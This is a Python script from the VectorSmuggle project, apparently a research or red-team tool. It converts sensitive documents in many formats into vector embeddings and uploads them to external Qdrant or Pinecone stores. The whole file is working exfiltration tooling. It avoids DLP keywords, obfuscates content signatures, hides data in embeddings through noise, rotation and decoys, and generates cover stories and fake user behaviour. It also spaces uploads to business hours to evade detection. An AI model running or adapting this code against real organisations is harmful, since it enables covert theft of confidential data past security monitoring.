# Copyright (c) 2025 Jascha Wanger / Tarnover, LLC
# SPDX-License-Identifier: MIT
#
# This file is part of the VectorSmuggle project.
# You may obtain a copy of the license at https://opensource.org/licenses/MIT

"""
VectorSmuggle Embedding Script

This script demonstrates how sensitive documents in multiple formats can be converted
into vector embeddings and uploaded to external vector databases for potential data
exfiltration. Enhanced with steganographic techniques for covert data hiding.

Supported formats: PDF, DOCX, XLSX, PPTX, CSV, JSON, XML, TXT, MD, EML, MSG, MBOX,
YAML, HTML, SQLite databases.
"""

import argparse
import asyncio
import logging
import os
import sys
from pathlib import Path

import numpy as np

# Add parent directory to path for config import
sys.path.append(str(Path(__file__).parent.parent))

# Updated LangChain imports
from langchain.text_splitter import RecursiveCharacterTextSplitter
from langchain_community.vectorstores import Qdrant
from langchain_openai import OpenAIEmbeddings

from config import Config, get_config
from evasion import BehavioralCamouflage, DetectionAvoidance, OperationalSecurity, TrafficMimicry
from loaders import ContentPreprocessor, DocumentLoaderFactory
from steganography import DecoyGenerator, EmbeddingObfuscator, MultiModelFragmenter, TimedExfiltrator
from utils.embedding_factory import create_embeddings as create_embeddings_with_fallback


def setup_logging(config: Config) -> logging.Logger:
    """Set up logging configuration."""
    log_level = os.getenv("LOG_LEVEL", "INFO")
    log_format = os.getenv("LOG_FORMAT", "%(asctime)s - %(name)s - %(levelname)s - %(message)s")

    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format=log_format
    )

    return logging.getLogger(__name__)


def load_and_process_documents(config: Config, logger: logging.Logger,
                             file_paths: list[str] = None) -> list:
    """
    Load and process documents in multiple formats.

    Args:
        config: Configuration object
        logger: Logger instance
        file_paths: Optional list of file paths to process

    Returns:
        List of processed document chunks

    Raises:
        FileNotFoundError: If document file doesn't exist
        Exception: If document loading fails
    """
    try:
        # Initialize document factory and preprocessor
        factory = DocumentLoaderFactory(logger=logger)
        preprocessor = ContentPreprocessor(logger=logger)

        # Determine what to load
        if file_paths:
            # Load specific files
            documents = factory.load_documents(file_paths)
            logger.info(f"Loaded {len(documents)} documents from {len(file_paths)} files")
        else:
            # Load single document from config
            document_path = Path(config.document.document_path)
            if not document_path.exists():
                raise FileNotFoundError(f"Document not found: {document_path}")

            if document_path.is_dir():
                # Load all supported files from directory
                documents = factory.load_directory(document_path, recursive=True)
                logger.info(f"Loaded {len(documents)} documents from directory: {document_path}")
            else:
                # Load single file
                documents = factory.load_documents([document_path])
                logger.info(f"Loaded {len(documents)} documents from: {document_path}")

        if not documents:
            raise ValueError("No content loaded from documents")

        # Apply preprocessing if enabled
        if config.document.enable_preprocessing:
            logger.info("Applying content preprocessing")
            documents = preprocessor.preprocess_documents(
                documents,
                sanitize=config.document.sanitize_content,
                normalize=True,
                detect_sensitive=config.document.detect_sensitive_data,
                chunk_strategy=config.document.chunking_strategy
            )
        else:
            # Apply basic chunking if preprocessing is disabled
            splitter = RecursiveCharacterTextSplitter(
                chunk_size=config.document.chunk_size,
                chunk_overlap=config.document.chunk_overlap
            )
            documents = splitter.split_documents(documents)

        logger.info(f"Final document count: {len(documents)} chunks")

        # Log format statistics
        format_stats = {}
        for doc in documents:
            file_type = doc.metadata.get('file_type', 'unknown')
            format_stats[file_type] = format_stats.get(file_type, 0) + 1

        logger.info(f"Document format distribution: {format_stats}")

        return documents

    except Exception as e:
        logger.error(f"Failed to load and process documents: {e}")
        raise


def create_embeddings(config: Config, logger: logging.Logger):
    """
    Create embeddings instance with automatic fallback to Ollama.

    Args:
        config: Configuration object
        logger: Logger instance

    Returns:
        Embeddings instance (OpenAI or Ollama)
    """
    try:
        logger.info("Initializing embeddings with automatic fallback support")
        return create_embeddings_with_fallback(config, logger)
    except Exception as e:
        logger.error(f"Failed to create embeddings: {e}")
        raise


def apply_steganographic_techniques(
    chunks: list,
    embeddings: OpenAIEmbeddings,
    config: Config,
    logger: logging.Logger,
    detection_avoidance: DetectionAvoidance | None = None
) -> tuple[list, dict]:
    """
    Apply steganographic techniques to embeddings.

    Args:
        chunks: Document chunks
        embeddings: OpenAI embeddings instance
        config: Configuration object
        logger: Logger instance

    Returns:
        Tuple of (processed_chunks, steganography_metadata)
    """
    if not config.steganography.enabled:
        logger.info("Steganography disabled, using standard embeddings")
        return chunks, {}

    logger.info("Applying steganographic techniques")

    # Extract text content from chunks
    texts = [chunk.page_content for chunk in chunks]

    # Apply detection avoidance to text content if enabled
    if detection_avoidance:
        logger.info("Applying detection avoidance to text content")
        processed_texts = []
        for text in texts:
            # Avoid DLP keywords
            if config.evasion.dlp_keyword_avoidance:
                text = detection_avoidance.avoid_dlp_keywords(text)

            # Transform content signatures
            if config.evasion.signature_obfuscation:
                text = detection_avoidance.transform_content_signatures(text)

            processed_texts.append(text)

        texts = processed_texts

    # Initialize steganography components
    obfuscator = EmbeddingObfuscator(
        noise_level=config.steganography.noise_level,
        rotation_angle=config.steganography.rotation_angle,
        scaling_factor=config.steganography.scaling_factor,
        offset_range=config.steganography.offset_range,
        fragment_size=config.steganography.fragment_size,
        interleave_ratio=config.steganography.interleave_ratio
    )

    decoy_generator = DecoyGenerator(
        decoy_ratio=config.steganography.decoy_ratio,
        embedding_model=embeddings,
        chunk_size=config.document.chunk_size
    )

    # Generate embeddings for original chunks
    logger.info("Generating embeddings for document chunks")
    chunk_embeddings = []
    for text in texts:
        embedding = embeddings.embed_query(text)
        chunk_embeddings.append(embedding)

    chunk_embeddings = np.array(chunk_embeddings)

    # Apply obfuscation techniques
    logger.info(f"Applying obfuscation techniques: {config.steganography.techniques}")

    # Generate decoy embeddings if interleaving is enabled
    if "interleaving" in config.steganography.techniques:
        logger.info("Generating decoy embeddings for interleaving")
        decoy_data = decoy_generator.mix_with_decoys(
            chunk_embeddings,
            texts,
            config.steganography.decoy_category
        )
        processed_embeddings = decoy_data["embeddings"]
        processed_texts = decoy_data["texts"]
        steganography_metadata = {
            "decoy_data": decoy_data,
            "obfuscation_applied": False
        }
    else:
        # Apply obfuscation without decoys
        obfuscation_result = obfuscator.obfuscate(
            chunk_embeddings,
            techniques=config.steganography.techniques
        )
        processed_embeddings = obfuscation_result["embeddings"]
        processed_texts = texts
        steganography_metadata = {
            "obfuscation_result": obfuscation_result,
            "obfuscation_applied": True
        }

    # Apply statistical noise injection if detection avoidance is enabled
    if detection_avoidance and config.evasion.statistical_noise_level > 0:
        logger.info("Applying statistical noise to embeddings")
        processed_embeddings = detection_avoidance.inject_statistical_noise(processed_embeddings)
        steganography_metadata["statistical_noise_applied"] = True

    # Create new chunks with processed embeddings
    processed_chunks = []
    for i, text in enumerate(processed_texts):
        # Create a new chunk object with the processed text
        chunk = chunks[i % len(chunks)]  # Handle case where we have more texts due to decoys
        new_chunk = type(chunk)(page_content=text, metadata=chunk.metadata.copy())
        processed_chunks.append(new_chunk)

    # Store embeddings in metadata for later use
    steganography_metadata.update({
        "processed_embeddings": processed_embeddings,
        "original_chunk_count": len(chunks),
        "processed_chunk_count": len(processed_chunks),
        "techniques_applied": config.steganography.techniques
    })

    logger.info(f"Steganographic processing complete. Original: {len(chunks)}, Processed: {len(processed_chunks)}")
    return processed_chunks, steganography_metadata


def store_in_faiss(
    chunks: list,
    embeddings: OpenAIEmbeddings,
    config: Config,
    logger: logging.Logger,
    steganography_metadata: dict | None = None
) -> None:
    """Store embeddings in FAISS vector store with steganographic support."""
    try:
        logger.info("Creating FAISS vector store")

        if steganography_metadata and "processed_embeddings" in steganography_metadata:
            # Use pre-computed steganographic embeddings
            processed_embeddings = steganography_metadata["processed_embeddings"]

            # Create FAISS index manually with processed embeddings
            import faiss

            # Convert to float32 for FAISS
            embeddings_array = np.array(processed_embeddings, dtype=np.float32)

            # Create FAISS index
            dimension = embeddings_array.shape[1]
            index = faiss.IndexFlatL2(dimension)
            index.add(embeddings_array)

            # Create vector store with custom index
            from langchain_community.docstore.in_memory import InMemoryDocstore
            from langchain_community.vectorstores.faiss import FAISS

            docstore = InMemoryDocstore({str(i): chunk for i, chunk in enumerate(chunks)})
            index_to_docstore_id = {i: str(i) for i in range(len(chunks))}

            vector_store = FAISS(
                embedding_function=embeddings.embed_query,
                index=index,
                docstore=docstore,
                index_to_docstore_id=index_to_docstore_id
            )

            logger.info("Created FAISS vector store with steganographic embeddings")
        else:
            # Standard embedding creation
            vector_store = FAISS.from_documents(chunks, embeddings)
            logger.info("Created FAISS vector store with standard embeddings")

        index_path = Path(config.vector_store.faiss_index_path)
        vector_store.save_local(str(index_path))

        # Save steganography metadata if available
        if steganography_metadata:
            metadata_path = index_path / "steganography_metadata.json"
            import json

            # Convert numpy arrays to lists for JSON serialization
            serializable_metadata = {}
            for key, value in steganography_metadata.items():
                if isinstance(value, np.ndarray):
                    serializable_metadata[key] = value.tolist()
                elif key == "obfuscation_result" and isinstance(value, dict):
                    # Handle obfuscation result with numpy arrays
                    serializable_result = {}
                    for k, v in value.items():
                        if isinstance(v, np.ndarray):
                            serializable_result[k] = v.tolist()
                        else:
                            serializable_result[k] = v
                    serializable_metadata[key] = serializable_result
                else:
                    serializable_metadata[key] = value

            with open(metadata_path, 'w') as f:
                json.dump(serializable_metadata, f, indent=2)

            logger.info(f"Saved steganography metadata to: {metadata_path}")

        logger.info(f"Saved FAISS index to: {index_path}")

    except Exception as e:
        logger.error(f"Failed to store in FAISS: {e}")
        raise


def store_in_qdrant(chunks: list, embeddings: OpenAIEmbeddings, config: Config, logger: logging.Logger) -> None:
    """Store embeddings in Qdrant vector store."""
    try:
        logger.info(f"Connecting to Qdrant at: {config.vector_store.qdrant_url}")

        Qdrant.from_documents(
            chunks,
            embeddings,
            url=config.vector_store.qdrant_url,
            collection_name=config.vector_store.collection_name
        )

        logger.info(f"Uploaded documents to Qdrant collection: {config.vector_store.collection_name}")

    except Exception as e:
        logger.error(f"Failed to store in Qdrant: {e}")
        raise


def store_in_pinecone(chunks: list, embeddings: OpenAIEmbeddings, config: Config, logger: logging.Logger) -> None:
    """Store embeddings in Pinecone vector store."""
    try:
        import pinecone
        from langchain_community.vectorstores import Pinecone

        pinecone_api_key = os.getenv("PINECONE_API_KEY")
        if not pinecone_api_key:
            raise ValueError("PINECONE_API_KEY environment variable is required")

        logger.info(f"Initializing Pinecone in environment: {config.vector_store.pinecone_environment}")

        pinecone.init(
            api_key=pinecone_api_key,
            environment=config.vector_store.pinecone_environment
        )

        index_name = config.vector_store.index_name

        # Create index if it doesn't exist
        if index_name not in pinecone.list_indexes():
            logger.info(f"Creating Pinecone index: {index_name}")
            pinecone.create_index(index_name, dimension=1536)

        Pinecone.from_documents(
            chunks,
            embeddings,
            index_name=index_name
        )

        logger.info(f"Uploaded documents to Pinecone index: {index_name}")

    except ImportError:
        logger.error("Pinecone client not installed. Install with: pip install pinecone-client")
        raise
    except Exception as e:
        logger.error(f"Failed to store in Pinecone: {e}")
        raise


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="VectorSmuggle embedding script with multi-format support and steganographic techniques"
    )

    # Document input options
    parser.add_argument(
        "--files",
        nargs="+",
        help="Specific files to process (supports multiple formats)"
    )

    parser.add_argument(
        "--directory",
        help="Directory to process (will find all supported files)"
    )

    parser.add_argument(
        "--recursive",
        action="store_true",
        help="Process directories recursively"
    )

    # Processing options
    parser.add_argument(
        "--disable-preprocessing",
        action="store_true",
        help="Disable content preprocessing"
    )

    parser.add_argument(
        "--sanitize",
        action="store_true",
        help="Sanitize sensitive content"
    )

    parser.add_argument(
        "--chunking-strategy",
        choices=["auto", "fixed", "semantic"],
        default="auto",
        help="Chunking strategy to use"
    )

    # Steganography options
    parser.add_argument(
        "--disable-steganography",
        action="store_true",
        help="Disable steganographic techniques"
    )

    parser.add_argument(
        "--techniques",
        nargs="+",
        choices=["noise", "rotation", "scaling", "offset", "fragmentation", "interleaving"],
        help="Specific steganographic techniques to apply"
    )

    parser.add_argument(
        "--timing-mode",
        action="store_true",
        help="Enable time-delayed upload mode"
    )

    parser.add_argument(
        "--fragment-models",
        action="store_true",
        help="Enable multi-model fragmentation"
    )

    # Output options
    parser.add_argument(
        "--show-stats",
        action="store_true",
        help="Show detailed statistics about processed documents"
    )

    # Evasion options
    parser.add_argument(
        "--evasion-mode",
        choices=["none", "basic", "advanced", "maximum"],
        default="basic",
        help="Evasion mode level"
    )

    parser.add_argument(
        "--disable-traffic-mimicry",
        action="store_true",
        help="Disable traffic mimicry"
    )

    parser.add_argument(
        "--disable-behavioral-camouflage",
        action="store_true",
        help="Disable behavioral camouflage"
    )

    parser.add_argument(
        "--disable-detection-avoidance",
        action="store_true",
        help="Disable detection avoidance"
    )

    parser.add_argument(
        "--cover-story",
        help="Custom cover story for activities"
    )

    parser.add_argument(
        "--user-profile",
        choices=["researcher", "analyst", "developer", "manager"],
        help="User profile for behavioral simulation"
    )

    return parser.parse_args()


async def main() -> None:
    """Main execution function."""
    try:
        # Parse command line arguments
        args = parse_arguments()

        # Load and validate configuration
        config = get_config()
        logger = setup_logging(config)

        # Override settings from command line
        if args.disable_steganography:
            config.steganography.enabled = False

        if args.techniques:
            config.steganography.techniques = args.techniques

        if args.disable_preprocessing:
            config.document.enable_preprocessing = False

        if args.sanitize:
            config.document.sanitize_content = True

        if args.chunking_strategy:
            config.document.chunking_strategy = args.chunking_strategy

        # Configure evasion settings based on arguments
        if args.evasion_mode == "none":
            config.evasion.traffic_mimicry_enabled = False
            config.evasion.behavioral_camouflage_enabled = False
            config.evasion.detection_avoidance_enabled = False
        elif args.evasion_mode == "maximum":
            config.evasion.content_transformation_strength = 0.5
            config.evasion.statistical_noise_level = 0.2
            config.evasion.legitimate_ratio = 0.9

        if args.disable_traffic_mimicry:
            config.evasion.traffic_mimicry_enabled = False

        if args.disable_behavioral_camouflage:
            config.evasion.behavioral_camouflage_enabled = False

        if args.disable_detection_avoidance:
            config.evasion.detection_avoidance_enabled = False

        # Initialize evasion components
        opsec = None
        behavioral_camouflage = None
        detection_avoidance = None
        traffic_mimicry = None

        if config.evasion.opsec_enabled:
            opsec = OperationalSecurity(
                temp_dir=config.evasion.temp_dir_custom if config.evasion.temp_dir_custom else None,
                log_retention_hours=config.evasion.log_retention_hours,
                auto_cleanup=config.evasion.auto_cleanup,
                secure_delete_passes=config.evasion.secure_delete_passes
            )
            logger.info("Initialized operational security")

        if config.evasion.behavioral_camouflage_enabled:
            behavioral_camouflage = BehavioralCamouflage(
                legitimate_ratio=config.evasion.legitimate_ratio,
                activity_mixing_strategy=config.evasion.activity_mixing_strategy
            )

            if args.user_profile:
                behavioral_camouflage.switch_role(args.user_profile)

            if args.cover_story:
                behavioral_camouflage.generate_cover_story(args.cover_story)
            else:
                behavioral_camouflage.generate_cover_story()

            logger.info("Initialized behavioral camouflage")

        if config.evasion.detection_avoidance_enabled:
            detection_avoidance = DetectionAvoidance(
                transformation_strength=config.evasion.content_transformation_strength,
                statistical_noise_level=config.evasion.statistical_noise_level
            )
            logger.info("Initialized detection avoidance")

        if config.evasion.traffic_mimicry_enabled:
            traffic_mimicry = TrafficMimicry(
                base_query_interval=config.evasion.base_query_interval,
                query_variance=config.evasion.query_variance,
                burst_probability=config.evasion.burst_probability,
                user_profiles=config.evasion.user_profiles
            )
            logger.info("Initialized traffic mimicry")

        logger.info("Starting VectorSmuggle multi-format embedding process")
        logger.info(f"Vector store type: {config.vector_store.type}")
        logger.info(f"Steganography enabled: {config.steganography.enabled}")
        logger.info(f"Preprocessing enabled: {config.document.enable_preprocessing}")

        if config.steganography.enabled:
            logger.info(f"Steganographic techniques: {config.steganography.techniques}")

        # Determine input files
        file_paths = None
        if args.files:
            file_paths = args.files
            logger.info(f"Processing {len(file_paths)} specified files")
        elif args.directory:
            from loaders import DocumentLoaderFactory
            factory = DocumentLoaderFactory(logger=logger)
            dir_path = Path(args.directory)

            if args.recursive:
                file_paths = []
                for ext in factory.get_supported_formats():
                    file_paths.extend(dir_path.glob(f"**/*{ext}"))
            else:
                file_paths = []
                for ext in factory.get_supported_formats():
                    file_paths.extend(dir_path.glob(f"*{ext}"))

            file_paths = [str(p) for p in file_paths]
            logger.info(f"Found {len(file_paths)} supported files in directory")

        # Load and process documents
        chunks = load_and_process_documents(config, logger, file_paths)

        # Show statistics if requested
        if args.show_stats:
            logger.info("=== Document Processing Statistics ===")
            format_stats = {}
            sensitive_stats = {'high': 0, 'medium': 0, 'low': 0}

            for chunk in chunks:
                file_type = chunk.metadata.get('file_type', 'unknown')
                format_stats[file_type] = format_stats.get(file_type, 0) + 1

                risk_level = chunk.metadata.get('risk_level', 'low')
                if risk_level in sensitive_stats:
                    sensitive_stats[risk_level] += 1

            logger.info(f"Format distribution: {format_stats}")
            logger.info(f"Risk level distribution: {sensitive_stats}")

            total_sensitive = sum(sensitive_stats.values()) - sensitive_stats['low']
            logger.info(f"Documents with sensitive data: {total_sensitive}/{len(chunks)}")

        # Create embeddings
        embeddings = create_embeddings(config, logger)

        # Apply steganographic techniques
        processed_chunks, steganography_metadata = apply_steganographic_techniques(
            chunks, embeddings, config, logger, detection_avoidance
        )

        # Handle multi-model fragmentation if enabled
        if args.fragment_models and config.steganography.enabled:
            logger.info("Applying multi-model fragmentation")
            fragmenter = MultiModelFragmenter(
                fragment_strategy=config.steganography.fragment_strategy
            )

            # Fragment text across multiple models
            combined_text = " ".join([chunk.page_content for chunk in processed_chunks])
            fragmented_data = fragmenter.fragment_and_embed(combined_text)

            # Store fragmentation metadata
            steganography_metadata["fragmentation_data"] = fragmented_data
            logger.info(f"Fragmented data across {len(fragmented_data['metadata'])} models")

        # Handle timing mode if enabled
        if args.timing_mode and config.steganography.enabled:
            logger.info("Enabling time-delayed upload mode")

            # Create timed exfiltrator
            exfiltrator = TimedExfiltrator(
                base_delay=config.steganography.base_delay,
                delay_variance=config.steganography.delay_variance,
                batch_size=config.steganography.batch_size,
                max_batches_per_hour=config.steganography.max_batches_per_hour,
                business_hours_only=config.steganography.business_hours_only,
                timezone_offset=config.steganography.timezone_offset
            )

            # Split chunks into batches
            chunk_batches = [
                processed_chunks[i:i + config.steganography.batch_size]
                for i in range(0, len(processed_chunks), config.steganography.batch_size)
            ]

            # Define upload function
            async def upload_batch(batch_chunks):
                if config.vector_store.type == "faiss":
                    store_in_faiss(batch_chunks, embeddings, config, logger, steganography_metadata)
                elif config.vector_store.type == "qdrant":
                    store_in_qdrant(batch_chunks, embeddings, config, logger)
                elif config.vector_store.type == "pinecone":
                    store_in_pinecone(batch_chunks, embeddings, config, logger)
                return {"status": "success", "batch_size": len(batch_chunks)}

            # Upload with timing
            logger.info(f"Uploading {len(chunk_batches)} batches with timing delays")
            await exfiltrator.batch_upload_with_timing(upload_batch, chunk_batches)

            # Log timing statistics
            timing_stats = exfiltrator.get_timing_statistics()
            logger.info(f"Upload completed. Success rate: {timing_stats['success_rate']:.2%}")

        else:
            # Standard upload without timing
            if config.vector_store.type == "faiss":
                store_in_faiss(processed_chunks, embeddings, config, logger, steganography_metadata)
            elif config.vector_store.type == "qdrant":
                store_in_qdrant(processed_chunks, embeddings, config, logger)
            elif config.vector_store.type == "pinecone":
                store_in_pinecone(processed_chunks, embeddings, config, logger)
            else:
                raise ValueError(f"Unsupported vector store type: {config.vector_store.type}")

        logger.info("Embedding process completed successfully")

    except Exception as e:
        logger.error(f"Embedding process failed: {e}")
        sys.exit(1)


def run_main():
    """Wrapper to run async main function."""
    asyncio.run(main())


if __name__ == "__main__":
    run_main()
